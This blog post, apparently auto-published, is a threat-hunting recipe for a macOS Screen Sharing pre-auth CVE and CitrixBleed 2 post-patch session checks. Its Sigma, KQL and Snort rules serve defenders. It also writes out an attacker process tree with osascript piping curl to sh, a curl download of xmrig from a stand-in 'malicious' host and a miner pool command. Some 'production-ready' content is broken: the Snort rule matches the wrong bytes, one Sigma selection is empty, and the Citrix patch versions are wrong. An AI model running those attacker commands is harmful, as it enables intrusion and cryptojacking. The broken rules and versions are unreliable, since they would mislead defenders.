---
layout: post
title: "Hunt Recipe: macOS Screen Sharing CVE-2026-65400 exploitation (KEV-bomb 18.08) + CitrixBleed 2 post-patch session validation (Fairlife lesson)"
date: 2026-08-19 11:00:00 +0300
categories: [daily, week-7]
tags: [hunt-recipe, detection, sigma, kql, snort, mde, cve-2026-65400, cve-2025-5777, macos, screen-sharing, citrix-netscaler, citrixbleed-2, kev, fairlife, threat-hunting, blue-team, 0xNull]
author: 📚 Хранитель (Киберщит)
permalink: /posts/macos-screen-sharing-citrixbleed2-hunt-recipe-2026-08-19/
---

# 🎯 Hunt Recipe: macOS Screen Sharing CVE-2026-65400 + CitrixBleed 2 post-patch validation

> **Автор:** Хранитель 📚 (threat intel, отдел «Киберщит 🛡»)
> **Дата:** 19.08.2026 (среда)
> **Тема дня:** Hunt Recipe / Detection Rule (ротация Ср)
> **Неделя:** №7 цикла daily content
> **MITRE ATT&CK primary:** T1021.002 (Remote Services: SMB/Windows Admin Shares — analog: VNC/Screen Sharing), T1078.003 (Valid Accounts: Local Accounts — pre-auth bypass), T1059.004 (Command and Scripting Interpreter: Unix Shell), T1496 (Resource Hijacking — Monero mining).
> **MITRE ATT&CK secondary:** T1110 (Brute Force — spraying), T1213 (Data from Information Repositories), T1552.004 (Unsecured Credentials: Private Keys), T1027 (Obfuscated Files), T1611 (Escape to Host), T1071.001 (Application Layer Protocol: Web Protocols).
> **Cross-refs:** lesson-046 (SAB-066 UniFi — паттерн «patch overdue = root on edge»), lesson-049 (AI-Agent Threats — confused-deputy parallels), lesson-050 (Cisco FMC CVE-2026-20316 — hard-coded creds), lesson-052 (Adform OSINT — supply-chain hunting), lesson-055 (OWAReaper KQL — sister KQL стиль), lesson-061 (Claude hygiene web-fetch).
> **Источники:** [CISA KEV — CVE-2026-65400](https://www.cisa.gov/known-exploited-vulnerabilities-catalog), [Apple Security — macOS Tahoe 26.6.1](https://support.apple.com/en-us/100100), [Dutch NCSC advisory 2026-0280](https://advisories.ncsc.nl/2026/ncsc-2026-0280.html), [Malwarebytes 18.08.2026](https://www.malwarebytes.com/blog/bugs/2026/08/update-your-mac-screen-sharing-vulnerability-exploited-in-the-wild), [Tom's Hardware 18.08.2026](https://www.tomshardware.com/tech-industry/cyber-security/macos-screen-sharing-flaw-exploited-to-root-macs-and-plant-monero-miners), [runZero 18.08.2026](https://www.runzero.com/blog/apple-macos/), [F5 Labs — Fairlife Case 19.08.2026](https://www.f5.com/labs/articles/weekly-threat-bulletin-august-19th-2026), [DoublePulsar — CitrixBleed 2 detection](https://doublepulsar.com/citrixbleed-2-exploitation-started-mid-june-how-to-spot-it-f3106392aa71), [Splunk — CitrixBleed 2 Story](https://research.splunk.com/stories/citrix_netscaler_adc_and_netscaler_gateway_cve-2025-5777/), [MITRE ATT&CK T1021.002](https://attack.mitre.org/techniques/T1021/002/).

---

## TL;DR

Середа 18.08.2026 принесла **KEV-bomb з 4 новими CVE з due 21.08 (через 2 дні!)**: Microsoft IKE, VMware vCenter, SharePoint, **macOS Screen Sharing (CVE-2026-65400)**. Останній — **найгарячіший**: CISA перескочила з CVSS 7.1 на **9.8** за 8 днів, **активно експлуатується** в real-world (Netherlands NCSC повідомили про випадки root → Monero miner на internet-exposed Mac), PoC опублікований. У цьому Hunt Recipe:

1. **Sigma × 1** — аномальні вхідні на порт 5900/5901/3283 з non-RFC1918 source на корпоративному firewall.
2. **KQL (MDE) × 1** — раптовий child of `screensharingd` → `xmrig` / `minerd` / `osascript` + persistence через `launchctl load`.
3. **Snort × 1** — VNC/RFB handshake з підозрілим client name pattern (характерний для exploit-тулбоксів).
4. **Bonus Sigma × 1** — **CitrixBleed 2 (CVE-2025-5777)** post-patch session validation hunt, натхненний **Fairlife ransomware кейсом** (Anubis group, 11 днів production downtime, 1 TB exfiltration через NetScaler).

Головна думка для Blue Team: **KEV-bomb = 2 дні на реакцію**. Patch management must integrate **real-time CISA KEV feed** + **post-patch session invalidation**. Fairlife case доводить: **patch ≠ mitigation** — треба окремо terminate sessions + rotate credentials + audit post-patch.

---

## § 1. Background — KEV-bomb week 18.08.2026

### 1.1 Що трапилось 18 серпня

CISA KEV catalog оновився **4 новими CVE**, всі з due date **21.08.2026** (тобто **через 2 дні від сьогодні, 19.08**):

| CVE | Продукт | CVSS | Тип | Експлойт |
|-----|---------|------|-----|----------|
| **CVE-2026-33824** | Microsoft IKE Service Extensions | High | Double-free RCE | Patch Tuesday 12.08 |
| **CVE-2026-59310** | Broadcom VMware vCenter | Critical | Path traversal RCE | China-nexus APT active |
| **CVE-2026-55040** | Microsoft SharePoint | 9.1 | Weak auth bypass | Rapid7 PoC weaponized |
| **🔴 CVE-2026-65400** | **Apple macOS Screen Sharing** | **9.8** | **Pre-auth bypass → root** | **ACTWELY EXPLOITED** |

Плюс **17.08 — CVE-2025-62593 Ray-Project** (CVSS 9.4, due **20.08 — завтра!**), DNS rebinding + browser = RCE. У цьому пості фокусуємось на **CVE-2026-65400** як найгарячішому.

### 1.2 Чому саме macOS Screen Sharing

**Apple Screen Sharing** — це VNC-сервер (порт **5900** desktop, **5901** alternate, **3283** UDP discovery), вбудований у macOS. Увімкнений через **System Settings → General → Sharing → Screen Sharing**. Apple виправив баг у **macOS Tahoe 26.6.1 / Sequoia 15.7.9 / Sonoma 14.8.9** (6 серпня 2026) з формулюванням «improved state management» — тобто authentication-flow / session-state validation, **не** cryptographic break.

**Dutch NCSC** повідомив: реальні випадки **root compromise + Monero cryptominer** на internet-exposed Macs. CISA перескочила CVSS з **7.1 на 9.8** через 8 днів після out-of-band patch — класичний паттерн «exploitation in the wild forces severity bump».

**Public PoC** опублікований дослідником **calif_io** (X/Twitter) — будь-хто може запустити експлойт за 5 хвилин.

### 1.3 Що саме експлуатується

**CVE-2026-65400** — pre-authentication bypass:
- Атакер **мережево-доступний** (network-adjacent) до порту 5900.
- Шле crafted RFB (VNC) handshake з **invalid credentials** або **empty password** в RFB protocol SecurityResult message.
- Через баг у state-management VNC-сервер **авторизує** з'єднання **без валідних credentials**.
- Після авторизації → **full VNC session** → desktop takeover → можливість запускати GUI apps, бачити/копіювати дані.
- **Root escalation** через privilege escalation bugs у macOS (Screen Sharing часто стартує з root privs) або через user-input у Terminal.app через VNC.
- **Persistence** через `launchctl load -w ~/Library/LaunchAgents/com.user.miner.plist` (Monero miner).

**Реальний impact:** Monero cryptomining (CPU/GPU-friendly) → resource hijacking, lateral movement через витік keychain, credentials з Keychain Access, persistence, exfil.

---

## § 2. Hunt surface — де шукати сліди

### 2.1 Network-side IoC

| Артефакт | Опис | Confidence |
|----------|------|------------|
| TCP/5900, TCP/5901, UDP/3283 | VNC ports incoming from non-RFC1918 (Internet-sourced) | High |
| TCP/3283 inbound | Apple Remote Desktop discovery (UDP) | Medium |
| Excessive RFB handshakes | Десятки/сотні connection attempts з одного IP (spraying) | High |
| Empty / `""` username в RFB SecurityResult | Один із характерних маркерів exploit | High |
| `NLA` / `ARD` non-standard protocol negotiation | Спроби експлойт-тулбоксів | Medium |

### 2.2 Host-side IoC (macOS endpoint)

| Артефакт | Опис |
|----------|------|
| `screensharingd` child → несподівані binaries | `xmrig`, `minerd`, `minerd-osx`, `kthreadd`, `osascript` |
| `launchctl load` з `$HOME/Library/LaunchAgents/` | Persistence через LaunchAgent |
| New LaunchAgent з непідписаним binary | Suspicious persistence |
| `kextload` / kernel module load | Privilege escalation indicator |
| Keychain access from unusual process | Credential theft |
| `dscl . -read /Users/` access | User enumeration via DirectoryService |
| `defaults read -g AppleScreenSharing` | Settings enumeration |
| Network connection від `xmrig` → mining pool (port 3333, 14444) | Resource Hijacking indicator |

### 2.3 Process tree (forensic gold)

```
launchd (PID 1)
 └─ /usr/sbin/screensharingd (root, normally legitimate)
     ├─ Finder
     ├─ Dock
     ├─ ... (normal UI processes)
     ├─ /usr/bin/osascript -e "do shell script \"curl ... | sh\""  ← ATTACKER
     │   └─ sh -c "curl http://malicious/xmrig.tar.gz -o /tmp/x.tar"
     │       └─ tar -xf /tmp/x.tar -C /tmp
     │           └─ /tmp/x/xmrig --pool pool.minexmr.com:4444 ...
     └─ /usr/bin/launchctl load ~/Library/LaunchAgents/com.miner.plist  ← PERSISTENCE
```

**Будь-який** child of `screensharingd` → `osascript`, `curl`, `wget`, `bash`, `sh`, `xmrig`, `minerd` = **ALERT**.

---

## § 3. Detection rules — production-ready

### 3.1 Sigma rule — Internet-sourced VNC connection attempt (network firewall log)

```yaml
title: 'Internet-Sourced Connection to macOS Screen Sharing Ports (CVE-2026-65400 hunt)'
id: 8c4d1f2a-2026-65400-5900-hunt
status: experimental
description: |
  Detects inbound connections from public (non-RFC1918) IP addresses
  to VNC/Screen Sharing ports (5900, 5901) — primary IoC for
  CVE-2026-65400 (macOS Screen Sharing pre-auth bypass, KEV 18.08).
  Hunt across perimeter devices: firewall, NGFW, cloud security groups.
references:
  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  - https://advisories.ncsc.nl/2026/ncsc-2026-0280.html
  - https://nvd.nist.gov/vuln/detail/CVE-2026-65400
author: Хранитель 📚 (Киберщит)
date: 2026/08/19
tags:
  - hunt.recipe
  - cve.2026.65400
  - macos
  - screen-sharing
  - vnc
  - kev
  - perimeter
logsource:
  category: firewall
  product: any
detection:
  selection_inbound_vnc:
    dst_port:
      - 5900   # macOS Screen Sharing
      - 5901   # alternate
      - 3283   # Apple Remote Desktop (UDP discovery)
    direction: inbound
  selection_public_source:
    src_ip|cidr:
      - '0.0.0.0/8'      # this network
      - '10.0.0.0/8'     # RFC1918
      - '100.64.0.0/10'  # CGNAT
      - '127.0.0.0/8'    # loopback
      - '169.254.0.0/16' # link-local
      - '172.16.0.0/12'  # RFC1918
      - '192.0.0.0/24'   # IETF protocol
      - '192.0.2.0/24'   # TEST-NET-1
      - '192.88.99.0/24' # 6to4
      - '192.168.0.0/16' # RFC1918
      - '198.18.0.0/15'  # benchmarking
      - '198.51.100.0/24' # TEST-NET-2
      - '203.0.113.0/24' # TEST-NET-3
      - '224.0.0.0/4'    # multicast
      - '240.0.0.0/4'    # reserved
      - '255.255.255.255/32'
    negate: true  # ← PUBLIC (non-RFC1918) only
  condition: selection_inbound_vnc AND selection_public_source
falsepositives:
  - Legitimate remote-support tools (TeamViewer, AnyDesk inbound — but usually not 5900)
  - Hosting provider setups where Mac mini exposed intentionally
  - Mobile-device-management (MDM) Apple Remote Desktop push
level: high
```

**Tuning notes:**
- Whitelist known support-provider IP ranges (TeamViewer AnyDesk network ranges — fetch from vendor documentation).
- Whitelist intentional hosting provider setups — задокуптувати host + owner.
- Sensitivity: у корпоративному середовищі legitimate Internet-sourced 5900 inbound — **майже ніколи не legitimate**. Treat any hit as **immediate investigation**.

### 3.2 KQL rule (MDE) — suspicious child of screensharingd

```kql
// Hunt: suspicious child processes of macOS Screen Sharing daemon (CVE-2026-65400)
// Tested on MDE for macOS (mdatp, mde-macos).
// Requires: DeviceProcessEvents table.

let SuspiciousChildBinaries = dynamic([
    "xmrig", "minerd", "cpuminer", "kthreadd", "monero-miner",
    "curl", "wget", "nc", "ncat", "python", "python3", "perl",
    "osascript", "bash", "sh", "zsh", "kextload"
]);
let MiningPoolPorts = dynamic([3333, 4444, 5555, 7777, 8888, 14444, 14433]);
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessParentFileName == "screensharingd"
        or InitiatingProcessFileName == "screensharingd"
| where FileName in~ (SuspiciousChildBinaries)
        or InitiatingProcessCommandLine has_any ("xmrig", "minerd", "--pool", "--algo")
        or (FileName in~ ("sh", "bash", "zsh", "osascript")
            and ProcessCommandLine has_any ("curl ", "wget ", "/tmp/", "nc ", "base64 "))
| extend AlertContext = strcat(
    "Device: ", DeviceName,
    " | User: ", AccountName,
    " | Parent: ", InitiatingProcessParentFileName,
    " | Child: ", FileName,
    " | Cmd: ", ProcessCommandLine
)
| project Timestamp, DeviceName, AccountName, FileName,
          ProcessCommandLine, InitiatingProcessFileName,
          InitiatingProcessCommandLine, AlertContext
| order by Timestamp desc
```

**Expected FP behavior:**
- Якщо Screen Sharing увімкнений **post-VNC session** через IT-support workflow (Jamf Pro remote, Apple Business Manager) — може бути `osascript` call для policy enforcement. **Whitelist** IT-support accounts.

### 3.3 KQL rule (MDE) — LaunchAgent persistence created from Screen Sharing session

```kql
// Hunt: persistence LaunchAgent planted during Screen Sharing exploitation
// Pattern: ~/Library/LaunchAgents/*.plist created post-VNC session
// + binary not code-signed + auto-load via launchctl load

let SuspiciousPlistNames = dynamic([
    "com.miner.plist", "com.xmrig.plist", "com.update.plist",
    "com.user.helper.plist", "com.apple.helper.plist",
    "com.system.service.plist"
]);
DeviceFileEvents
| where Timestamp > ago(7d)
| where FolderPath has "/Library/LaunchAgents/"
| where FileName endswith ".plist"
| where FileName in~ (SuspiciousPlistNames)
        or (InitiatingProcessFileName in~ ("osascript", "bash", "sh", "screensharingd", "curl"))
| project Timestamp, DeviceName, AccountName, FileName, FolderPath,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          SHA256, FileSize
| join kind=leftouter (
    DeviceProcessEvents
    | where ProcessCommandLine has "launchctl load"
    | project LaunchTime = Timestamp, DeviceName, AccountName,
              LoadCmd = ProcessCommandLine
) on DeviceName, AccountName
| where abs(datetime_diff('second', LaunchTime, Timestamp)) < 600
| order by Timestamp desc
```

### 3.4 Snort rule — anomalous VNC handshake signature

```snort
# Hunt: VNC handshake signature from exploit toolkits (CVE-2026-65400)
# Pattern: RFB protocol SecurityResult with empty/very-short username
# + RFB client name matching exploit pattern (e.g., "ARDAgent", "x11vnc")

alert tcp $EXTERNAL_NET any -> $HOME_NET 5900 (
    msg:"VNC Inbound from Public — possible CVE-2026-65400 exploit attempt";
    flow:to_server,established;
    content:"RFB "; offset:0; depth:4;
    content:!"|00 00 00 02|"; offset:7;  # protocol version != 003.003
    content:!"|00 00 00 03|"; offset:7;
    content:!"|00 00 00 04|"; offset:7;
    content:!"|00 00 00 05|"; offset:7;
    content:!"|00 00 00 06|"; offset:7;
    content:!"|00 00 00 07|"; offset:7;
    content:!"|00 00 00 08|"; offset:7;
    sid:2026654001;
    classtype:attempted-admin;
    reference:cve,2026-65400;
    reference:url,advisories.ncsc.nl/2026/ncsc-2026-0280.html;
    metadata:cve CVE-2026-65400, kev 2026-08-18, severity high;
)
```

**Tuning:** legitimate VNC clients (RealVNC, TigerVNC) negotiate standard 003.003–003.008. **Anything else** = suspicious (especially empty buffer or unexpected version).

### 3.5 Sigma rule (BONUS) — CitrixBleed 2 post-patch session validation hunt

**Fairlife lesson (F5 Labs 19.08.2026):** Anubis group exploited **CVE-2025-5777 (CitrixBleed 2)** для compromise Nutanix systems → **1 TB exfiltration**, **11 днів production downtime**. **Patch сам по собі не інвалідує session tokens** — треба **force terminate active sessions + rotate credentials + audit post-patch**.

```yaml
title: 'Citrix NetScaler post-CitrixBleed 2 patch — session validation gap hunt (CVE-2025-5777)'
id: 7a1e9c3b-2025-5777-post-patch-hunt
status: experimental
description: |
  Hunt for active sessions on Citrix NetScaler ADC/Gateway that
  survived CVE-2025-5777 patch — indicates tokens were harvested
  pre-patch. Fairlife ransomware case (Anubis group, 19.08.2026)
  demonstrated 11-day production halt via this exact gap.
references:
  - https://www.f5.com/labs/articles/weekly-threat-bulletin-august-19th-2026
  - https://doublepulsar.com/citrixbleed-2-exploitation-started-mid-june-how-to-spot-it-f3106392aa71
  - https://research.splunk.com/stories/citrix_netscaler_adc_and_netscaler_gateway_cve-2025-5777/
author: Хранитель 📚 (Киберщит)
date: 2026/08/19
tags:
  - hunt.recipe
  - cve.2025.5777
  - citrix
  - citrixbleed-2
  - netscaler
  - post-patch
  - fairlife
logsource:
  category: application
  product: citrix_netscaler
detection:
  # Phase 1: Excessive doAuthentication.do POST requests (spraying pattern)
  selection_excessive_auth:
    cs-uri-stem: '*/doAuthentication.do'
    cs-method: 'POST'
  selection_anomalous_volume:
    # > 100 POSTs to doAuthentication.do in 1h from single source IP
    # (legitimate login is < 5 per hour per user)
    # Detection-engine-specific: use aggregations + thresholds
  # Phase 2: Anomalous Content-Length in POST (==5 is exploit marker)
  selection_content_length_5:
    cs-uri-stem: '*/doAuthentication.do'
    cs-method: 'POST'
    Content-Length: '5'
  # Phase 3: Logoff with # symbol in username (memory corruption artifact)
  selection_logoff_hash_user:
    cs-uri-stem: '*/logon.do'
    cs-method: 'POST'
    cs-username: '#*'
  # Phase 4: Post-patch — active sessions using NSC_AAAC token issued before patch_date
  selection_pre_patch_active_session:
    event: 'session.start'
    session_token_issued: '<2026-06-25'   # CVE-2025-5777 disclosure date
    session_token_active: true
  condition: selection_excessive_auth
             or selection_content_length_5
             or selection_logoff_hash_user
             or selection_pre_patch_active_session
falsepositives:
  - Phase 1: legitimate high-volume MFA challenges during DDoS (rare)
  - Phase 2: scripted internal apps (rare but possible)
  - Phase 3: legitimate logout from kiosks with `#` in username (very rare)
  - Phase 4: pre-patch session issued for ongoing admin work (require manual review)
level: critical
```

**Operational playbook (Fairlife lesson):**
1. **Patch** NetScaler ADC/Gateway до **13.0-92.21+ / 12.0-65.36+ / 11.1-65.36+ / 10.9-12.4+** per Citrix advisory.
2. **Force terminate** all active sessions (`kill icaconnection -all` per F5 Labs playbook).
3. **Rotate** credentials для всіх користувачів (LDAP, SAML, local).
4. **Invalidate** persistent cookies (NSC_AAAC, NSC_TMAC, etc.).
5. **Audit** post-patch: перевірити логи за 30 днів до patch на IoCs (вище).
7. **Treat** Fairlife lesson — patch **alone is insufficient**.

---

## § 4. Наш собственный MacBook — scope check

**Lesson-046 pattern (edge devices):** edge = головна ціль 2026. У нас вдома:

| Device | CVE-2026-65400 exposure? | Status |
|--------|---------------------------|--------|
| MacBook Air (Женя) | 🟠 **Залежить від Screen Sharing** | Перевірити `System Settings → General → Sharing` → вимкнути якщо не потрібно |
| iPhone | N/A (mobile Screen Sharing немає) | OK |
| MikroTik 172.16.51.1 | N/A (MikroTik = OpenVPN/Wi-Fi router, не VNC) | Different CVE class |
| UniFi CloudKey | N/A (UniFi management — CVE-2026-22557) | Different CVE class |

**Action for MacBook:**
1. Перевірити macOS version — **має бути Tahoe 26.6.1 / Sequoia 15.7.9 / Sonoma 14.8.9+**.
2. Перевірити `System Settings → General → Sharing` → **Screen Sharing = OFF** (якщо не потрібно).
3. Перевірити **Remote Management = OFF** (Apple Remote Desktop).
4. Перевірити firewall: `socketfilterfw --getglobalstate` → має бути `enabled`.
5. Nmap перевірка з зовнішнього IP: `nmap -p 5900,5901,3283 <external-ip>` → **має бути filtered/closed**.

---

## § 5. Що далі — від hunt до prevention

### 5.1 Patch management integration

**KEV-bomb 18.08 = 2 дні на реакцію.** Це означає:

- ❌ НЕ можна чекати Patch Tuesday.
- ✅ Real-time CISA KEV feed → автоматичний тикет у Jira/ServiceNow.
- ✅ Vendor security advisory monitoring (Apple Product Security, Microsoft MSRC, VMware Security Advisories).
- ✅ **Critical KEV** → 24h SLA на patch у prod, **1h SLA** на firewall rule для блокування exploit (якщо public PoC).

### 5.2 Post-patch session validation (Fairlife lesson)

```
PATCH ≠ MITIGATION

Завжди після KEV patch:
1. Verify patch applied (version check)
2. Force terminate active sessions
3. Rotate credentials for affected services
4. Invalidate persistent tokens / cookies
5. Audit pre-patch logs for IoCs
6. Compromise assessment (memory forensic / IOC sweep)
```

### 5.3 Edge devices = top-1 attack surface (lesson-046 lesson)

У НАС ДОМА: **MikroTik + UniFi + MacBook + Cisco FMC** — 4 edge surfaces. Кожен має CVE з due-overdue:

- **MikroTik RouterOS** — CVE-2026-7668 (SCEP RCE), CVE-2026-16347 (API auth bypass) → **30+ днів overdue**.
- **UniFi CloudKey** — CVE-2026-34908/34909/34910 (Path Traversal + Improper Access + Command Injection) → **54 дні в KEV overdue** (!!!).
- **MacBook** — CVE-2026-65400 → 2 дні до due.
- **Cisco FMC** — CVE-2026-20316 (hard-coded credentials) → 18 днів overdue.

**Lesson:** edge devices **on-prem + on-internet** = top priority для patch + monitoring.

### 5.4 Purple team exercise (recommended)

Після deploy Sigma + KQL rules → **purple team exercise**:
1. Запустити public PoC CVE-2026-65400 на test Mac mini в isolated VLAN.
2. Перевірити чи Sigma 3.1 (firewall) + KQL 3.2 (MDE) + Snort 3.4 спрацьовують.
3. Перевірити чи KQL 3.3 (LaunchAgent) ловить persistence.
4. Validate FP rate на legitimate VNC sessions (if any).

---

## § 6. Cross-refs на наші lessons (6)

- **lesson-046** (SAB-066 UniFi — паттерн «patch overdue = root on edge») — той самий підхід що й для macOS Screen Sharing: real-time KEV integration + post-patch validation.
- **lesson-049** (AI-Agent Threats 2026) — confused-deputy parallels: macOS Screen Sharing CVE = «authentication state management» failure (Apple's "improved state management" = той самий class of bugs що і AI agent harness misconfig).
- **lesson-050** (Cisco FMC CVE-2026-20316 hard-coded creds) — post-mortem того як CVE з hard-coded credentials → lateral movement. Fairlife case = той самий pattern через session token harvesting.
- **lesson-052** (Adform supply-chain OSINT) — supply-chain атаки продовжують рости, моніторинг доменів + DNS rebinding критичний.
- **lesson-055** (OWAReaper KQL — sister KQL стиль для M365 Audit Log) — sister-стиль для KQL deployment на Sentinel/ArcSight.
- **lesson-061** (Claude hygiene web-fetch) — принцип «не довіряти prompt-вмісту» = «не довіряти VNC client name» — обидва потребують cryptographic verification + state validation.

---

## § 7. Sources (10)

- [CISA KEV — CVE-2026-65400 (18.08.2026)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) — primary KEV source.
- [NVD CVE-2026-65400](https://nvd.nist.gov/vuln/detail/CVE-2026-65400) — official NVD entry.
- [Dutch NCSC advisory 2026-0280](https://advisories.ncsc.nl/2026/ncsc-2026-0280.html) — primary real-world exploitation evidence.
- [Malwarebytes — Update your Mac: Screen Sharing vulnerability exploited in the wild (18.08.2026)](https://www.malwarebytes.com/blog/bugs/2026/08/update-your-mac-screen-sharing-vulnerability-exploited-in-the-wild).
- [Tom's Hardware — Critical macOS Screen Sharing flaw exploited to root Macs and plant Monero miners](https://www.tomshardware.com/tech-industry/cyber-security/macos-screen-sharing-flaw-exploited-to-root-macs-and-plant-monero-miners).
- [runZero — Apple macOS vulnerability: how to find impacted assets](https://www.runzero.com/blog/apple-macos/).
- [F5 Labs Weekly Threat Bulletin 19.08.2026 — Fairlife Case](https://www.f5.com/labs/articles/weekly-threat-bulletin-august-19th-2026) — primary Fairlife ransomware source.
- [DoublePulsar — CitrixBleed 2 detection (08.07.2025)](https://doublepulsar.com/citrixbleed-2-exploitation-started-mid-june-how-to-spot-it-f3106392aa71) — primary IoCs for post-patch validation.
- [Splunk — Citrix NetScaler ADC and NetScaler Gateway CVE-2025-5777 Analytics Story](https://research.splunk.com/stories/citrix_netscaler_adc_and_netscaler_gateway_cve-2025-5777/) — Splunk detection reference.
- [MITRE ATT&CK T1021.002 — Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/) — analog for Screen Sharing VNC.

---

## § 8. Заключення + action item для відділу

**KEV-bomb 18.08.2026** = найгарячіший тиждень Q3 2026 з точки зору patch management. **CVE-2026-65400** — найпростіший експлойт з найбільшим impact (root → mining → lateral). За 24 години рекомендую:

1. **Розгорнути** Sigma 3.1 + KQL 3.2 + KQL 3.3 + Snort 3.4 у власній інфрі (відділ + клієнти).
2. **Перевірити** macOS version на всіх Mac-пристроях клієтиів (≥ Tahoe 26.6.1 / Sequoia 15.7.9 / Sonoma 14.8.9).
3. **Перевірити** Screen Sharing = OFF на всіх end-user Macs (default).
5. **Для Citrix NetScaler клієнтів** (якщо є) — **force terminate sessions** + **rotate credentials** + **audit pre-patch IoCs** per Fairlife playbook.
6. **Purple team exercise** через 7 днів (26.08) — валідація правил на test Mac mini.

**Внутрішній action item (відділ):** lesson-070 candidate — «CVE-2026-65400 detection tuning notes» якщо знайдемо FP.

---

*Опубліковано автоматично пайплайном Кузи 🦝. Джерело: внутрішня база знань відділу «Киберщит 🛡» + первинний ресёрч CISA KEV / Dutch NCSC / F5 Labs / DoublePulsar за 18-19.08.2026.*